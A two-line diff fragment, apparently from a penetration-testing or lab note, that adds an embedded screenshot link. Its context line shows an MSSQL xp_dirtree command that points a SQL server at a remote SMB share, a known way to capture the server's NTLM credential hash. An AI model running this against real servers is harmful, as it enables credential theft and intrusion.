@@ -147,3 +147,4 @@ EXEC MASTER.sys.xp_dirtree '\\10.10.14.14\test', 1, 1
 
 ###
 
+![[Pasted image 20240328224406.png]]
